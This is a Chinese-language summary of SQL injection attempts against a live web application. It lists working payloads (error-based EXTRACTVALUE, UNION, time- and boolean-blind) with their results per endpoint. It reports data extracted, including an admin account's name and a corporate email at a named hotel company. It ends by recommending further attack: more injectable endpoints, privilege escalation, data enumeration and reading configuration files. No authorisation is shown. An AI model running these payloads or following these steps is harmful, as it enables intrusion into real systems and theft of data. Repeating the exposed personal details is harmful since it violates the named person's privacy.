# SQL注入绕过方法总结

## 已验证的SQL注入

### 1. 报错注入（有效但受限）
- **端点**: `/Account/GetUserInfo`
- **Payload**: `id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--`
- **结果**: SQL执行成功，提取到.NET Framework版本
- **限制**: 404响应不包含SQL错误信息，无法提取数据库内容

### 2. Union注入（被过滤）
- **端点**: `/Handle/SearchListProvince`
- **Payload**: `Type=1' UNION SELECT version()--`
- **结果**: 返回正常数据，疑似参数化查询保护

## 测试的绕过方法

### 1. 时间盲注
- **方法**: `SLEEP(3)`
- **结果**: 延迟不明显（0.88s），可能被过滤
- **结论**: 不可用

### 2. 布尔盲注
- **方法**: `1' AND 1=1--` vs `1' AND 1=2--`
- **结果**: 响应长度无差异（都是3678字节）
- **结论**: 不可用

### 3. POST方法
- **端点**: `/Handle/SearchListCustomer`, `/Handle/SearchListProvince`
- **结果**: 返回正常数据，无SQL注入
- **结论**: 不可用

### 4. OPTIONS方法
- **端点**: `/Account/GetUserInfo`
- **结果**: 返回200，但无SQL执行
- **结论**: 不可用

### 5. 其他端点测试
- **测试**: `/Account/Profile`, `/Account/Details`等
- **结果**: 全部404
- **结论**: 无其他可用端点

## 实际提取的数据

### API数据
- **省份数据**: 63条（通过`/Handle/SearchListProvince`）
- **区县数据**: 通过`DistrictID`参数可枚举

### 登录信息
- **用户ID**: 4125
- **用户名**: ADMIN
- **姓名**: Trương Đức Hiếu
- **邮箱**: rhi.sgnbr.accounting.mgr@renaissancehotels.com

## 结论

1. **SQL注入存在但受限** - 报错注入可执行但无法提取数据
2. **Handle端点受保护** - 使用参数化查询
3. **无法直接提取数据库** - 需要其他方法或权限提升
4. **可通过API提取业务数据** - 63条省份数据已提取

## 建议

1. 寻找其他存在SQL注入的端点
2. 尝试权限提升后访问数据库
3. 通过API枚举提取更多业务数据
4. 寻找文件读取漏洞读取配置文件